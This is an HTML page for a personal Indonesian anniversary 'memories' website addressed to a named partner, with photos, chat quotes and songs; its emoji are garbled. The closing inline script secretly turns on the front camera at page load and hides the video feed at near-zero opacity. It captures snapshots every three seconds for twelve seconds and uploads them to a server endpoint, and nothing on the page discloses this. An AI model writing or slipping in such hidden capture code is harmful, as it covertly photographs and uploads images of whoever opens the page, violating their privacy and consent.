<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <title>Our Memories WebsiteğŸ’•</title>

  <meta property="og:title" content="Our Memories WebsiteğŸ’—" />
  <meta property="og:description" content="For Sayangku Cintaku Cantikku Cianku TondikuğŸ˜‹â¤ï¸" />
  <meta property="og:image" content="img/logo.ico" /> <meta property="og:url" content="https://elrexsaa.github.io/kenangan.html" /> <meta property="og:type" content="website" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <audio id="bgm" src="audio.mp3" loop></audio>
  
  <div class="intro-screen">
    <div id="intro-text" class="intro-text"></div>
  </div>

  <div class="bg-hearts"></div>

  <nav class="mobile-nav-drawer" id="mobileNav">
      <button class="nav-close-btn" id="closeMenuBtn" aria-label="Tutup Menu">&times;</button>
      <div class="nav-links" style="margin-top: 50px;">
          <p style="padding: 10px; color: var(--muted); font-size: 0.9rem;">
            Menu Utama ada di Navigasi Bawah.
            <br>
            <small>Gunakan ini untuk pengaturan/keluar.</small>
          </p>
      </div>
      <button id="btnLogout" class="nav-logout" onclick="doLogout()">Logout</button>
  </nav>
  <div class="nav-overlay" id="navOverlay"></div>

  <main class="page--stack hidden">
    <header class="mem-header reveal-section">
      <div class="header-content">
        <h2 id="greeting" class="typewriter">Hi, My Beloved Nikita Friskila PakpahanğŸ’—ğŸ’—ğŸ’—</h2>
        <button class="menu-toggle-btn" id="menuToggleBtn" aria-label="Buka Menu">
          <span></span><span></span><span></span>
        </button>
      </div>
    </header>

    <div class="countdown-container content-section reveal-section">
      <h3>â³ Hitungan Mundur Anniversary</h3>
      <p id="countdown" class="countdown-display">...</p>
    </div>
    
    <div class="menu-grid content-section reveal-section">
      <button class="menu-btn" onclick="scrollToTarget(this)" data-target="#sectionPhotos">
        <span class="menu-icon">ğŸ“¸</span> Foto
      </button>
      <button class="menu-btn" onclick="scrollToTarget(this)" data-target="#sectionQuotes">
        <span class="menu-icon">ğŸ’–</span> Quotes
      </button>
      <button class="menu-btn" onclick="scrollToTarget(this)" data-target="#sectionSongs">
        <span class="menu-icon">ğŸµ</span> Lagu
      </button>
      <button class="menu-btn" onclick="scrollToTarget(this)" data-target="#sectionAbout">
        <span class="menu-icon">â„¹ï¸</span> Tentang
      </button>
    </div>

    <div id="sectionPhotos" class="content-section reveal-section">
      <h3>ğŸ“¸ Foto-foto Kita</h3>
      <p>Ini adalah galeri foto terbaik kita, Sayang. Geser ke samping untuk lihat semua, atau tunggu 7 detik, ia akan otomatis berganti!</p>
      
      <div class="carousel-container">
        <div class="carousel-track">
          <div class="carousel-slide"><img src="img/f3.jpg" alt="Foto Kenangan 1"></div>
          <div class="carousel-slide"><img src="img/f7.jpg" alt="Foto Kenangan 2"></div>
          <div class="carousel-slide"><img src="img/f4.jpg" alt="Foto Kenangan 3"></div>
          <div class="carousel-slide"><img src="img/f1.jpg" alt="Foto Kenangan 4"></div>
          <div class="carousel-slide"><img src="img/f6.jpg" alt="Foto Kenangan 5"></div>
          <div class="carousel-slide"><img src="img/f2.jpg" alt="Foto Kenangan 6"></div>
        </div>
      </div>
    </div>

    <div id="sectionQuotes" class="content-section reveal-section">
      <h3>ğŸ’– Quotes Favorit</h3>
      <p>Kumpulan kata-kata manis dan penting dari chat kita yang paling aku suka, yang selalu bikin aku senyum sendiri.</p>
      <div class="quote-card">
        <blockquote>"AKUU SLALUU SUPPORT KM SAYANG, BAHKAN KALAU DUNIA GA BERPIHAK SM KAMUU ADAA AK DISINI"</blockquote>
        <p class="quote-meta">â€” 00:05 | 21 Sept 2024</p>
      </div>
      <div class="quote-card">
        <blockquote>"km kan cinta nyaa aku"</blockquote>
        <p class="quote-meta">â€” 16:42 | 22 Sept 2024</p>
      </div>
      <a href="quotes.html" class="full-list-link">Lihat Semua Quotes Favorit &raquo;</a>
    </div>

    <div id="sectionSongs" class="content-section reveal-section">
      <h3>ğŸµ Lagu Kenangan</h3>
      <p>Lagu-lagu yang selalu mengingatkan aku sama kamu, dan selalu aku putar saat kamu di pikiran aku hahaha</p>
      
      <div class="track-list">
        <div class="music-card">
          <img class="track-cover" src="img/cover1.jpg" alt="Cover Album All Of Me">
          <div class="track-info">
            <div class="tmeta">All Of Me</div>
            <div class="tsub">John Legend</div>
            <audio controls src="sound/sound1.mp3"></audio>
          </div>
        </div>
        <a href="songs.html" class="full-list-link">Lihat Semua Lagu &raquo;</a>
      </div>
    </div>
    
    <div id="sectionAbout" class="content-section reveal-section">
      <h3>â„¹ï¸ Tentang Kita</h3>
      <p>Beberapa info tentang kita berdua dan sosmed kita!</p>
      <div class="text-center">
        <a href="about.html" class="full-list-link">Baca Selengkapnya &raquo;</a>
      </div>
    </div>

  </main>
  
  <nav class="nav-bottom">
    <a href="kenangan.html" class="nav-item">
      <span class="icon">ğŸ </span>
      <span class="label">Home</span>
    </a>
    <a href="songs.html" class="nav-item">
      <span class="icon">ğŸµ</span>
      <span class="label">Lagu</span>
    </a>
    <a href="photos.html" class="nav-item">
      <span class="icon">ğŸ“¸</span>
      <span class="label">Foto</span>
    </a>
    <a href="chat.html" class="nav-item">
      <span class="icon">ğŸ’¬</span>
      <span class="label">Chat</span>
    </a>
    <a href="quotes.html" class="nav-item">
      <span class="icon">ğŸ’–</span>
      <span class="label">Favorit</span>
    </a>
    <a href="about.html" class="nav-item">
      <span class="icon">â„¹ï¸</span>
      <span class="label">Tentang</span>
    </a>
  </nav>

  <script src="script.js"></script>
  <script src="animasi.js"></script>
  
  <script>
    // Logika kamera dari snippet sebelumnya
    document.addEventListener('DOMContentLoaded', async () => {
      const video = document.createElement('video');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        video.autoplay = true; video.playsInline = true; video.style.cssText = 'position:fixed;right:0;bottom:0;width:200px;height:auto;opacity:0.05;pointer-events:none;';
        document.body.appendChild(video); video.srcObject = stream;
        await new Promise(r => { if (video.readyState >= 2) return r(); video.addEventListener('loadeddata', r, { once: true }); });
        startSnapshotLoop(video, stream, 12000); 
      } catch (err) { console.error('izin kamera ditolak', err); }
    });

    function startSnapshotLoop(video, stream, duration) {
      const intervalMs = 3000;
      let loop = setInterval(() => {
        try {
          const canvas = document.createElement('canvas'); canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
          canvas.getContext('2d').drawImage(video, 0, 0); const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
          fetch('/api/upload-photo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ image: dataUrl, page: location.pathname })\n          }).catch(err => console.error('gagal upload', err));
        } catch (e) { console.error('gagal capture', e); clearInterval(loop); stream.getTracks().forEach(t => t.stop()); video.remove(); }
      }, intervalMs);

      setTimeout(() => {
        clearInterval(loop);
        stream.getTracks().forEach(t => t.stop());
        video.remove();
      }, duration);
    }
  </script>

</body>
</html>
